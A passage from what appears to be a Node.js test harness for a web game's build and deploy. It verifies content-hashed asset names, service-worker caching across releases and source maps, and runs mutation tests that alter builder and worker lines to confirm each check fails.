    if (afterInstall.length) fails.push('SB-7 the new worker downloaded again what the old one held: ' + afterInstall.slice(0, 3).map((r) => r.path).join(', '));
    if (!(await holds(glade))) fails.push('SB-7 the release lost an atlas the player already held (no page names it)');
    const dropped = Object.keys(a.release.files).find((k) => k.endsWith('.js') && !existsSync(join(next.out, k)));
    if (dropped && await holds(dropped)) fails.push('SB-7 the new cache still holds a chunk the new release no longer names: ' + dropped);
    /* and the return after it asks for nothing */
    await sleep((MAX_AGE + 0.5) * 1000);
    site.log.length = 0;
    await atForm(site.base + '/play.html');
    const again = hashedAsked(site.log);
    if (again.length) fails.push('SB-7 the return after the release asked the server for ' + again.length + ' file(s) of a/: ' + again.slice(0, 3).map((r) => r.path).join(', '));
    if (errors.length) fails.push('SB-7 page errors: ' + errors.slice(0, 2).join(' | '));
  } finally { await ctx.close(); await site.close(); }
}

// ── THE RUN ──────────────────────────────────────────────────────────────
const ALL = ['SB-1', 'SB-2', 'SB-3', 'SB-4', 'SB-5', 'SB-6', 'SB-7', 'SB-8', 'SB-9', 'SB-10', 'SB-11', 'SB-12'];
async function checks({ edit, workerText, rules = ALL } = {}) {
  const fails = [];
  const dir = mkdtempSync(join(tmpdir(), 'hr-ship-'));
  const builder = await builderOf(edit);
  const b = buildsFor(builder, dir);
  const wants = (r) => rules.includes(r);
  let lease = null;
  const browser = async () => { lease = lease || await leaseBrowser(chromium); return lease; };
  try {
    if (wants('SB-1')) await sb1(b, fails);
    if (wants('SB-2')) { const a = await b.build('a'); sb2(a.out, fails, a.table); }
    if (wants('SB-3')) await sb3(b, fails);
    if (wants('SB-4')) await sb4(fails);
    if (wants('SB-5')) await sb5(b, await browser(), fails);
    if (wants('SB-6')) await sb6(b, builder, fails);
    if (wants('SB-7')) await sb7(b, await browser(), fails, workerText);
    if (wants('SB-8')) await sb8(b, fails);
    if (wants('SB-9')) await sb9(b, fails);
    if (wants('SB-10')) await sb10(b, fails);
    if (wants('SB-11')) sb11(fails);
    if (wants('SB-12')) sb12(await b.build('a'), fails);
  } catch (e) {
    fails.push('HARNESS ' + (e && e.stack || e));
  } finally {
    if (lease) await lease.close().catch(() => {});
    try { rmSync(dir, { recursive: true, force: true, maxRetries: 3 }); } catch (e) { /* the OS tidies its own temp */ }
  }
  return fails;
}

/* [name, the file, from, to, the one rule that must go red] */
const MUTANTS = [
  ['two builds of one source differ', BUILDER, "const hashedName = (rel, buf) => { const ext = extname(rel); return OUT_HASHED + '/' + basename(rel, ext) + '-' + sha256(buf).slice(0, HASH_LEN) + ext; };", "let SEQ = Math.random().toString(36).slice(2, 8);\nconst hashedName = (rel, buf) => { const ext = extname(rel); SEQ += 'x'; return OUT_HASHED + '/' + basename(rel, ext) + '-' + SEQ + ext; };", 'SB-1'],
  ['the page keeps its plain stylesheets', BUILDER, "if (done) return ''; done = true; return '<link rel=\"stylesheet\" href=\"' + css + '\">\\n';", "return arguments[0];", 'SB-2'],
  ['the table is not written into src/site-files.js', BUILDER, "text = text.replace(anchor, 'const HASHED = ' + JSON.stringify(Object.fromEntries(copier.table)) + ';');", "/* left as it is */", 'SB-2'],
  ['a ?v= import reaches a chunk', BUILDER, "(m) => copier.put(m.replace(VERSION_QUERY, ''))", '(m) => m', 'SB-2'],
  ['the build leaves BUILD in a chunk', BUILDER, "text = text.replace(from, 'export const BUILD = Object.freeze(JSON.parse(document.documentElement.dataset.build));');", "/* left as it is */", 'SB-3'],
  ['every module in one chunk', BUILDER, "for (const [name, test] of LAYERS) {", "for (const [name, test] of []) {", 'SB-3'],
  ['the deploy keeps nothing of the last release', BUILDER, "if (o.retainFrom) ({ kept, carried } = await retain(out, o.retainFrom, current, o.fetch || fetch));", "/* nothing kept */", 'SB-5'],
  ['a retained file is not checked', BUILDER, "if (sha256(buf) !== want) throw new Error('build-site: the deployed ' + rel + ' is not the file its release listed');", "/* trusted */", 'SB-6'],
  ['a site that cannot be read reads as a first deploy', BUILDER, "if (res.status === 404) return null;", "if (!res.ok) return null;", 'SB-6'],
  ['every release is kept for ever', BUILDER, "return older.filter((r, i) => i < min || Date.parse(r.builtAt) >= cutoff).slice(0, max);", "return older;", 'SB-6'],
  ['a first deploy drops the plain folder', BUILDER, "if (firstDeploy) for (const d of FIRST_DEPLOY_DIRS) cpSync(join(root, d), join(out, d), { recursive: true });", "/* dropped */", 'SB-6'],
  ['maps say where this machine built them', BUILDER, "map.sources = map.sources.map((s) => posix(relative(root, resolve(dirname(f.path), s))));", "map.sources = map.sources.map((s) => resolve(dirname(f.path), s));", 'SB-9'],
  ['no source maps', BUILDER, "sourcemap: 'linked', sourcesContent: true,", "sourcemap: false,", 'SB-9'],
  ['the worker does not keep the built names', WORKER_FILE, 'const isKept = (url) => isNamed(url) || atVersion(url);', 'const isKept = (url) => atVersion(url);', 'SB-7'],
  ['a release downloads again what the player holds', WORKER_FILE, 'if (named) await carryOver(cache).catch(', 'if (false) await carryOver(cache).catch(', 'SB-7'],
  ['a source map is kept', WORKER_FILE, " && !url.pathname.endsWith('.map');", ';', 'SB-7'],
  ['a built name is dated like a version', WORKER_FILE, 'if (!isNamed(new URL(res.url))) {', 'if (true) {', 'SB-7'],
];

async function mutate() {
  let bad = 0;
  for (const [name, file, from, to, rule] of MUTANTS) {
    const isBuilder = file === BUILDER;
    const source = readFileSync(isBuilder ? BUILDER : join(ROOT, file), 'utf8').replace(/\r\n/g, '\n');
    if (!source.includes(from)) { console.log('  ✗ ' + name + ': the anchor moved: ' + from); bad++; continue; }
    const t0 = Date.now();
    const fails = isBuilder
      ? await checks({ edit: (t) => t.replace(/\r\n/g, '\n').replace(from, () => to), rules: [rule] })
      : await checks({ workerText: source.replace(from, () => to), rules: [rule] });
    const caught = fails.some((f) => f.startsWith(rule + ' '));
    if (fails.some((f) => f.startsWith('HARNESS'))) console.log('    ' + fails.find((f) => f.startsWith('HARNESS')).slice(0, 300));
    console.log('  ' + (caught ? '✓' : '✗') + ' ' + name + ' [' + rule + '] ' + Math.round((Date.now() - t0) / 1000) + ' s' + (caught ? '' : ': ' + (fails.join(' | ').slice(0, 200) || 'stayed green')));
    if (!caught) bad++;
  }
  console.log(bad ? 'ship-build --mutate: ' + bad + ' of ' + MUTANTS.length + ' missed' : 'ship-build --mutate: all ' + MUTANTS.length + ' caught');
  return bad ? 1 : 0;
}

/* What ships is what was tested: the real suite and a real play over the built output, each its own process, exit codes read. */
async function suite() {
  const { buildSite } = await builderOf();
  const out = join(ROOT, 'dist');
  const built = await buildSite({ out });
  console.log('built v' + built.version + ' into dist/: ' + Object.keys(built.release.files).length + ' content-named files');
  const steps = [
    ['the in-page boot suite', ['tests/client-boot.mjs'], { HR_SITE_ROOT: 'dist' }],
    ['a play on the real engine', ['tools/qa/local-world.mjs', 'smoke', '--site', 'dist'], {}],
  ];
  let bad = 0;
  for (const [name, args, env] of steps) {
    const t0 = Date.now();
    const r = spawnSync(process.execPath, args, { cwd: ROOT, stdio: 'inherit', env: { ...process.env, ...env } });
    console.log((r.status === 0 ? '  ✓ ' : '  ✗ ') + name + ' over the built site: exit ' + r.status + ', ' + Math.round((Date.now() - t0) / 1000) + ' s');
    if (r.status !== 0) bad++;
  }
  console.log(bad ? 'ship-build --suite: RED' : 'ship-build --suite: the suite and the play pass over what ships');
  return bad ? 1 : 0;
}

const code = process.argv.includes('--suite') ? await suite() : process.argv.includes('--mutate') ? await mutate() : await (async () => {
  const fails = await checks();
  for (const f of fails) console.log('  ✗ ' + f);
  console.log(fails.length ? 'ship-build: ' + fails.length + ' RED' : 'ship-build: the built site resolves, a release renames only what it changed, an open tab outlives a deploy, the worker keeps the built names, the scans bite');
  return fails.length ? 1 : 0;
})();
process.exit(code);
